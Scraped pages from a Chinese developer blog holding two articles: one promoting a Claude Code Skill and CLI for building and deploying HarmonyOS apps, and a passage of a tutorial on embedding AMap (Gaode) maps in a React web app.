<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fclaude.ai%2Fcode" target="_blank" title="https://claude.ai/code" ref="nofollow noopener noreferrer">Claude Code</a> 是 Anthropic 推出的 AI 编程助手。<strong>Skill</strong> 是一种扩展机制，可以教会 Claude 特定领域的知识和能力。</p>
<p>当你安装了 harmonyos-build-deploy Skill 后，Claude 就具备了：</p>
<ul>
<li>🧠 理解鸿蒙项目结构（HAP/HSP/HAR 模块）</li>
<li>🔧 知道如何使用 hvigorw、hdc、ohpm 等工具</li>
<li>📦 能够分析模块依赖并按正确顺序编译</li>
<li>📱 可以将应用部署到真机并启动</li>
<li>🏪 能够打包 .app 文件用于上架 AppGallery</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c19d43d22b5a44ebbc87b51f7fe3208a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Z-O5Lit55qE6Zu-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770901805&amp;x-signature=i2%2B0pt%2BT%2FM1frVBMvtvdJQmEd54%3D" alt="01.1.png" loading="lazy"/></p>
<h2 data-id="heading-3">实际使用场景</h2>
<h3 data-id="heading-4">场景 1：日常开发调试</h3>
<p><strong>你只需要说：</strong></p>
<pre><code class="hljs">帮我编译一下这个鸿蒙项目，部署到手机上运行
</code></pre>
<p><strong>Claude 会自动：</strong></p>
<ol>
<li>识别这是一个鸿蒙项目</li>
<li>调用 <code>npx harmonyos-deploy --all --launch</code></li>
<li>等待编译完成，处理可能的错误</li>
<li>部署到设备并启动应用</li>
<li>向你报告结果</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56550596755444cfa9b446d1fe17a567~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Z-O5Lit55qE6Zu-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770901805&amp;x-signature=OOJQZoeUEN2vA9lZWdk4q4KkJeA%3D" alt="02.png" loading="lazy"/></p>
<h3 data-id="heading-5">场景 2：切换环境</h3>
<p><strong>你只需要说：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">切换到生产环境，用 release 模式重新打包部署
</code></pre>
<p><strong>Claude 理解后执行：</strong></p>
<pre><code class="hljs language-bash" lang="bash">npx harmonyos-deploy --all -p production --release --launch
</code></pre>
<h3 data-id="heading-6">场景 3：调试问题</h3>
<p><strong>你只需要说：</strong></p>
<pre><code class="hljs">应用好像有问题，帮我看看设备日志，过滤 NetworkError 相关的
</code></pre>
<p><strong>Claude 会：</strong></p>
<pre><code class="hljs language-bash" lang="bash">npx harmonyos-deploy --log-only --filter NetworkError
</code></pre>
<p>然后帮你分析日志内容，定位问题。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b825a6a74ae3424db345f1857dcf72cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Z-O5Lit55qE6Zu-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770901805&amp;x-signature=fcfLp1lVyVOG%2BTWoU8p27frYU9U%3D" alt="03.png" loading="lazy"/></p>
<h3 data-id="heading-7">场景 4：准备上架</h3>
<p><strong>你只需要说：</strong></p>
<pre><code class="hljs">项目开发完了，帮我打个包准备上架华为应用市场
</code></pre>
<p><strong>Claude 会：</strong></p>
<ol>
<li>使用 release 模式打包 .app 文件</li>
<li>确保 debuggable=false</li>
<li>输出文件路径和大小</li>
<li>告诉你下一步去 AppGallery Connect 上传</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">npx harmonyos-deploy --app -p production --release -o ./dist
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79520962ad3b4c3dacc31ef4a74d50e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Z-O5Lit55qE6Zu-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770901805&amp;x-signature=QNKhLeKIOu5f%2B34O5lbrRcXrpt8%3D" alt="04.png" loading="lazy"/></p>
<h2 data-id="heading-8">AI + Skill 的协作模式</h2>
<h3 data-id="heading-9">传统方式 vs AI Coding</h3>





























<table><thead><tr><th>传统方式</th><th>AI Coding + Skill</th></tr></thead><tbody><tr><td>查文档学习 hvigorw 命令</td><td>直接说"编译项目"</td></tr><tr><td>记忆各种参数组合</td><td>AI 自动选择正确参数</td></tr><tr><td>手动分析编译错误</td><td>AI 解读错误并给出修复建议</td></tr><tr><td>一个个执行命令</td><td>AI 自动串联完整流程</td></tr><tr><td>切换环境要改配置</td><td>说一句话就切换</td></tr></tbody></table>
<h3 data-id="heading-10">Skill 如何工作</h3>
<pre><code class="hljs language-css" lang="css">┌─────────────────────────────────────────────────────────────┐
│                        开发者                               │
│                    "帮我编译部署"                            │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                      Claude <span class="hljs-selector-tag">Code</span>                            │
│  <span class="hljs-number">1</span>. 理解用户意图：编译 + 部署                                │
│  <span class="hljs-number">2</span>. 识别项目类型：检测到 build-profile<span class="hljs-selector-class">.json5</span> → 鸿蒙项目      │
│  <span class="hljs-number">3</span>. 调用 Skill：harmonyos-build-deploy                      │
│  <span class="hljs-number">4</span>. 执行命令：npx harmonyos-deploy <span class="hljs-attr">--all</span> <span class="hljs-attr">--launch</span>           │
│  <span class="hljs-number">5</span>. 处理结果：成功/失败 → 反馈给用户                         │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                   harmonyos-deploy CLI                      │
│  • ohpm install                                             │
│  • hvigorw assembleHap/assembleHsp                          │
│  • hdc install                                              │
│  • aa start                                                 │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                      鸿蒙设备                                │
│                    应用成功运行                              │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec7b964855940a4b99b062e870b7c36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Z-O5Lit55qE6Zu-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770901805&amp;x-signature=M7rAbRnY7dSzR4Yy4kYnD9AswpM%3D" alt="02.2.png" loading="lazy"/></p>
<h2 data-id="heading-11">如何开始使用</h2>
<h3 data-id="heading-12">方式 1：在 Claude Code 中安装 Skill</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 skill</span>
/skill install harmonyos-build-deploy
</code></pre>
<p>安装后，Claude 就会在你提到鸿蒙编译、部署、hvigor、hdc 等关键词时自动激活这个 Skill。</p>
<h3 data-id="heading-13">方式 2：直接使用（无需 Skill）</h3>
<p>即使不安装 Skill，你也可以在对话中引导 Claude 使用这个工具：</p>
<pre><code class="hljs">我的项目是鸿蒙应用，请使用 npx harmonyos-deploy 来帮我编译部署
</code></pre>
<h3 data-id="heading-14">方式 3：项目级配置</h3>
<p>在项目根目录创建 <code>.claude/skills/</code> 文件夹，将 Skill 文件放入，Claude 会自动加载。</p>
<h2 data-id="heading-15">触发关键词</h2>
<p>当你在对话中提到以下关键词时，Claude 会自动识别并使用 harmonyos-build-deploy：</p>
<ul>
<li>鸿蒙、HarmonyOS、OpenHarmony</li>
<li>编译、构建、部署、安装</li>
<li>hvigor、hvigorw、hdc</li>
<li>HAP、HSP、HAR</li>
<li>AppGallery、上架</li>
<li>ohpm、hilog</li>
</ul>
<h2 data-id="heading-16">Skill 的技术实现</h2>
<h3 data-id="heading-17">零依赖设计</h3>
<p>整个工具是一个约 1900 行的 Node.js 脚本，不依赖任何第三方 npm 包。这意味着：</p>
<ul>
<li>✅ 无需 <code>npm install</code></li>
<li>✅ 直接 <code>npx</code> 运行</li>
<li>✅ AI 可以立即使用</li>
</ul>
<h3 data-id="heading-18">智能依赖解析</h3>
<p>对于多模块项目，工具会：</p>
<ol>
<li>扫描所有 <code>oh-package.json5</code></li>
<li>解析 dependencies 字段</li>
<li>构建依赖图</li>
<li>拓扑排序得到正确的编译顺序</li>
</ol>

<pre><code class="hljs language-scss" lang="scss">lushu_acommon (无依赖)
    ↓
lushu_appcommon (依赖 acommon)
    ↓
lushu_home, lushu_service... (依赖 acommon + appcommon)
    ↓
entry (HAP，最后编译)
</code></pre>
<h3 data-id="heading-19">错误诊断</h3>
<p>当编译或安装失败时，工具会分析错误并给出修复建议，AI 可以直接将这些信息呈现给你。</p>
<h2 data-id="heading-20">未来展望</h2>
<h3 data-id="heading-21">更深度的 AI 集成</h3>
<ul>
<li>🔮 AI 直接修改代码后自动重新编译部署</li>
<li>🔮 AI 分析运行时日志，自动定位并修复 Bug</li>
<li>🔮 AI 根据测试结果自动优化性能</li>
</ul>
<h3 data-id="heading-22">更完整的 DevOps 支持</h3>
<ul>
<li>🔮 自动化测试集成</li>
<li>🔮 多设备并行部署</li>
<li>🔮 版本管理和发布流程</li>
</ul>
<h2 data-id="heading-23">开源地址</h2>
<ul>
<li><strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsupermanaaaa%2Fharmonyos-build-deploy" target="_blank" title="https://github.com/supermanaaaa/harmonyos-build-deploy" ref="nofollow noopener noreferrer">github.com/supermanaaa…</a></li>
<li><strong>npm</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fharmonyos-deploy" target="_blank" title="https://www.npmjs.com/package/harmonyos-deploy" ref="nofollow noopener noreferrer">www.npmjs.com/package/har…</a></li>
<li><strong>Claude Skills</strong>: 已提交至 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fanthropics%2Fskills%2Fpull%2F342" target="_blank" title="https://github.com/anthropics/skills/pull/342" ref="nofollow noopener noreferrer">anthropics/skills</a></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ddff22b034214b15ad1275ac8c2218dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Z-O5Lit55qE6Zu-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770901805&amp;x-signature=RKj7QerwF2G9I%2FJ2bGoqolfcnxQ%3D" alt="05.png" loading="lazy"/></p>
<h2 data-id="heading-24">总结</h2>
<p><strong>harmonyos-build-deploy</strong> 不仅仅是一个 CLI 工具，更是连接 <strong>AI 能力</strong> 和 <strong>鸿蒙开发</strong> 的桥梁。</p>
<p>它的存在让 Claude 能够：</p>
<ul>
<li>理解鸿蒙项目的结构和构建流程</li>
<li>执行复杂的多模块编译</li>
<li>处理设备部署和调试</li>
<li>完成应用上架打包</li>
</ul>
<p>而你只需要：</p>
<ul>
<li>用自然语言描述需求</li>
<li>让 AI 帮你完成剩下的工作</li>
</ul>
<p><strong>这就是 AI Coding 时代的开发方式。</strong></p>
<hr/>
<blockquote>
<p>作者：supermanaaaa</p>
<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsupermanaaaa%2Fharmonyos-build-deploy" target="_blank" title="https://github.com/supermanaaaa/harmonyos-build-deploy" ref="nofollow noopener noreferrer">github.com/supermanaaa…</a></p>
<p>如果这个 Skill 对你有帮助，请给个 ⭐️ Star 支持一下！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在web应用中使用高德地图的能力]]></title>    <link>https://juejin.cn/post/7603195960254709760</link>    <guid>https://juejin.cn/post/7603195960254709760</guid>    <pubDate>2026-02-05T13:41:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254709760" data-draft-id="7602512064977584191" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在web应用中使用高德地图的能力"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-05T13:41:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FanetheDivine"/> <meta itemprop="url" content="https://juejin.cn/user/4246761716322491"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在web应用中使用高德地图的能力
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4246761716322491/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FanetheDivine
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:41:51.000Z" title="Thu Feb 05 2026 13:41:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">基础知识</h2>
<p>高德地图使用GCJ-02坐标 是经过加密变换后的坐标系统 与百度地图/GPS的坐标有所不同</p>
<p>可以使用<code>AMap.convertFrom</code>将GPS转化为高德坐标</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Ftools%2Fpicker" target="_blank" title="https://lbs.amap.com/tools/picker" ref="nofollow noopener noreferrer">官方坐标拾取工具</a></p>
<h2 data-id="heading-1">前期准备</h2>
<p>登录<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2F" target="_blank" title="https://lbs.amap.com/" ref="nofollow noopener noreferrer">高德开放平台</a>后在<a href="https://link.juejin.cn?target=https%3A%2F%2Fconsole.amap.com%2Fdev%2Fkey%2Fapp" target="_blank" title="https://console.amap.com/dev/key/app" ref="nofollow noopener noreferrer">控制台</a>创建应用、添加key 选择<code>Web端(JS API)</code> 并得到key和安全密钥</p>
<p>接下来 参考<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fguide%2Fabc%2Famap-react" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/guide/abc/amap-react" ref="nofollow noopener noreferrer">文档</a>在react构建地图组件</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-variable constant_">FC</span>, useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">AMapLoader</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@amap/amap-jsapi-loader'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title class_">MapContainer</span>: <span class="hljs-variable constant_">FC</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> mapRef = useRef&lt;<span class="hljs-built_in">any</span>&gt;(<span class="hljs-literal">null</span>)

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">createMap</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">map</span>) =&gt;</span> (mapRef.<span class="hljs-property">current</span> = map))
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      mapRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">destroy</span>()
    }
  }, [])

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'container'</span> <span class="hljs-attr">className</span>=<span class="hljs-string">'h-full w-full overflow-hidden'</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">MapContainer</span>

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createMap</span>(<span class="hljs-params"/>) {
  ;(<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">_AMapSecurityConfig</span> = {
    <span class="hljs-attr">securityJsCode</span>: <span class="hljs-string">''</span>, <span class="hljs-comment">// 安全密钥</span>
  }
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">AMap</span> = <span class="hljs-keyword">await</span> <span class="hljs-title class_">AMapLoader</span>.<span class="hljs-title function_">load</span>({
    <span class="hljs-attr">key</span>: <span class="hljs-string">''</span>, <span class="hljs-comment">// key</span>
    <span class="hljs-attr">version</span>: <span class="hljs-string">'2.0'</span>,
    <span class="hljs-attr">plugins</span>: [<span class="hljs-string">'AMap.Scale'</span>],
  })
  <span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">Map</span>(<span class="hljs-string">'container'</span>, {
    <span class="hljs-attr">viewMode</span>: <span class="hljs-string">'2D'</span>,
    <span class="hljs-attr">zoom</span>: <span class="hljs-number">11</span>,
    <span class="hljs-attr">center</span>: [<span class="hljs-number">116.397428</span>, <span class="hljs-number">39.90923</span>],
  })
  <span class="hljs-keyword">return</span> map
}
</code></pre>
<p>接下来将聚焦于<code>AMap.Map</code>类 在构造map实例时可以添加其他地图能力 实例本身也有函数对地图进行操作 也可以监听其中的事件</p>
<p>完整能力参考<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fdocumentation%23map" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/documentation#map" ref="nofollow noopener noreferrer">AMap官方文档</a></p>
<p>下面将按照<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Ftutorails%2Fdisplay-a-map" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/tutorails/display-a-map" ref="nofollow noopener noreferrer">官方文档</a>的 介绍高德地图的常见能力</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a372a0221f74b038de77cdd99819352~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=pVU39VObbsVYxnL6n9pcbV3eBfs%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">展示地图</h2>
<p>地图的展示与 zoom/center/mapStyle属性有关</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">Map</span>(<span class="hljs-string">'container'</span>, {
    <span class="hljs-attr">zoom</span>: <span class="hljs-number">11</span>,<span class="hljs-comment">// 缩放比 值越大 地图放大倍数越大 展示的范围就越小</span>
    <span class="hljs-attr">center</span>: [<span class="hljs-number">116.397428</span>, <span class="hljs-number">39.90923</span>],<span class="hljs-comment">//中心点</span>
    <span class="hljs-attr">mapStyle</span>: <span class="hljs-string">"amap://styles/normal"</span>, <span class="hljs-comment">//地图样式</span>
  })
</code></pre>
<p>地图样式参考<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Ftutorails%2Fdisplay-a-map%23s5" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/tutorails/display-a-map#s5" ref="nofollow noopener noreferrer">文档</a><br/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05f752c692194328bf0d462450a808b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=7GHJuXM8ZxuvCnYgkBgbI%2Bq645c%3D" alt="image.png" loading="lazy"/></p>
<p>构造函数中仅传入初始值 这些属性可能会被用户操作修改 也可以通过后续<code>map.setStatus</code>主动修改</p>
<h2 data-id="heading-3">图层</h2>
<p>图层可以整体为地图附加信息</p>
<p>添加图层前后
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e7f4d6f9a9d4c4e96663596ae201a8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=p7mMxyGwFLQMoLEeDCFS%2BxruE9c%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/efdabbc17b384a91ba1502a3d9809ccc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=hYywvudUbLfuHLGHsshyoiOOCzA%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 官方的交通图层 可以展示交通信息信息情况</span>
<span class="hljs-keyword">const</span> traffic = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-property">TileLayer</span>.<span class="hljs-title class_">Traffic</span>();

<span class="hljs-comment">// 变更map的图层(可以传数组)</span>
map.<span class="hljs-title function_">add</span>(traffic)
map.<span class="hljs-title function_">remove</span>(traffic)

<span class="hljs-comment">// 控制显隐</span>
traffic.<span class="hljs-title function_">hide</span>()
traffic.<span class="hljs-title function_">show</span>()

</code></pre>
<p>图层具有setOptions以设置属性</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fguide%2Flayers%2Fofficial-layers" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/guide/layers/official-layers" ref="nofollow noopener noreferrer">官方图层</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fdocumentation%23%25e9%25ab%2598%25e5%25be%25b7%25e5%25ae%2598%25e6%2596%25b9%25e5%259b%25be%25e5%25b1%2582" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/documentation#%e9%ab%98%e5%be%b7%e5%ae%98%e6%96%b9%e5%9b%be%e5%b1%82" ref="nofollow noopener noreferrer">完整的图层文档</a></p>
<h2 data-id="heading-4">控件</h2>
<p>指地图上的各种按钮 如缩放、比例尺等 位置仅与地图容器关联 不与坐标相关</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bef2201865834568b9e1335f798e28b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=3OmHq22C6GpVDczVSTH8VvLeQZ8%3D" alt="image.png" loading="lazy"/></p>
<p>需要动态引入控件 并通过map的addControl将其插入地图中</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-title class_">AMap</span>.<span class="hljs-title function_">plugin</span>(<span class="hljs-string">'AMap.ToolBar'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> toolbar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">ToolBar</span>() <span class="hljs-comment">// 缩放器</span>
    map.<span class="hljs-title function_">addControl</span>(toolbar)

  })    
   
    <span class="hljs-comment">// 如果需要移除控件</span>
    map.<span class="hljs-title function_">removeControl</span>(toolbar)
    
    <span class="hljs-comment">// 控制显隐</span>
    toolbar.<span class="hljs-title function_">hide</span>()
